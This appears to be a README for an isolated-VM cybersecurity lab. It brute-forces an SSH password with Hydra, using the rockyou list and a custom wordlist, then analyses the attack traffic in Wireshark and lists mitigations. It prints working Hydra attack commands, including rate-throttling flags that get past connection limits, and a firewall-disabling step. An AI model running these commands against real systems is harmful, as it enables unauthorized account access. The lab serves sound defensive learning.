# SSH-BruteForceHydra-Labratory
Cybersecurity lab: brute-forced SSH credentials with Hydra and analyzed the attack traffic in Wireshark, including the Diffie-Hellman handshake.
# SSH Brute-Force Attack Simulation (Hydra + Wireshark)

Simulated SSH brute-force attack using Hydra on Kali Linux, with Wireshark packet analysis of the attack and Diffie-Hellman key exchange.

**Tools used:** Kali Linux, Hydra, Wireshark, Ubuntu 24.04, Nmap-adjacent networking setup

---

## Abstract

This project performs a brute-force password attack against an SSH server using Hydra on Kali Linux. Wireshark is used to capture packets during the attack, and the resulting traffic is analyzed to understand what a brute-force attempt looks like at the network level.

## Introduction

Ubuntu 24.04 was used as the victim platform, while Hydra on Kali Linux was used to brute-force the SSH login — first with a common dictionary wordlist (`rockyou.txt`), then with a custom personal wordlist. Both VMs were configured with bridged network adapters so they could interact as separate entities on the network, simulating a more realistic attacker/victim setup.

> **Note:** The real password used in this lab has been redacted from this writeup. Screenshots have been reviewed to avoid exposing real credentials.

## Setup: Preparing the Victim (Ubuntu)

Commands used to configure the SSH service on the victim machine:

```bash
sudo apt update
sudo apt install openssh-server -y
sudo systemctl start ssh
sudo systemctl enable ssh
systemctl status ssh   # check SSH status if needed
```

Ubuntu's firewall (UFW) can block SSH by default. For this lab, the firewall was disabled to allow unrestricted testing:

```bash
sudo ufw disable
```

> ⚠️ Disabling the firewall entirely is only appropriate in an isolated lab environment — never on a production or internet-facing system. To allow SSH only while keeping the firewall active:
> ```bash
> sudo ufw allow ssh
> sudo ufw status
> ```

## Establishing a Baseline Connection

From the Kali machine, an SSH connection was manually established to confirm connectivity:

```bash
ssh username@<victim-ip>
```

This confirms the SSH service is reachable and prompts for a password — the same authentication step Hydra will later attempt to brute-force.

## Attack: Dictionary Wordlist

Hydra was run against the victim using a standard wordlist:

```bash
hydra -V -f -l vboxuser -P /usr/share/wordlists/rockyou.txt ssh://<victim-ip>
```

**Issue encountered:** Hydra experienced connection throttling and began failing around the 40–50 guess mark. To resolve this, the command was adjusted:

```bash
hydra -V -f -l vboxuser -P /usr/share/wordlists/rockyou.txt -t 1 -w 3 ssh://<victim-ip>
```

- `-t 1` — limits parallel connections, reducing load on the SSH server
- `-w 3` — adds a 3-second wait before retrying failed connection attempts

With these adjustments, Hydra successfully identified the correct password after 198 attempts out of 200.

## Attack: Custom Wordlist

A custom wordlist was created manually:

```bash
touch mywordlist.txt
echo "password123" >> mywordlist.txt
echo "letmein" >> mywordlist.txt
echo "qwerty" >> mywordlist.txt
```

Hydra was re-run using this smaller custom list, again successfully identifying the correct password — this time in far fewer attempts, since the list was much shorter and included the real password.

```bash
hydra -V -f -l vboxuser -P mywordlist.txt ssh://<victim-ip>
```

## Wireshark Analysis

Wireshark was used to capture traffic on port 22 throughout the attack. Key observations:

- **Diffie-Hellman Key Exchange:** Visible during the initial connection handshake. This is the cryptographic method that allows two parties to establish a shared secret over an insecure channel, without ever transmitting the secret itself. Its security relies on the difficulty of computing discrete logarithms, making the shared key infeasible to derive from the public exchange alone.
- **Successful login packets:** The packets corresponding to the correct password guess were visually distinguishable in the capture.
- **RST (Reset) packets:** Several packets were marked with `[RST]` flags, indicating the receiving machine terminated the connection — consistent with repeated failed login attempts during the brute-force process.
- **Port/protocol confirmation:** All traffic was confirmed on port 22 (standard SSH), both for source and destination.

## Conclusion

The Hydra brute-force attack against the SSH service was successful, correctly identifying the victim's password and confirming it via terminal output.

**Key takeaways:**
- Hydra is straightforward to configure and requires minimal information about the target — just an IP, username, and open service port.
- Attack duration scales heavily with password strength and wordlist size; strong passwords combined with rate-limiting can make brute-forcing impractical.
- This type of attack is detectable — repeated failed login attempts are a common indicator monitored by intrusion detection systems.
- Hydra isn't limited to SSH; it supports brute-forcing other services and protocols (e.g., HTTP login forms).

**Mitigations:**
- Enforce strong, unique passwords
- Implement account lockout / rate-limiting after repeated failed attempts
- Enable multi-factor authentication (MFA)

---

*This project was completed in an isolated virtual lab environment for educational purposes only.*
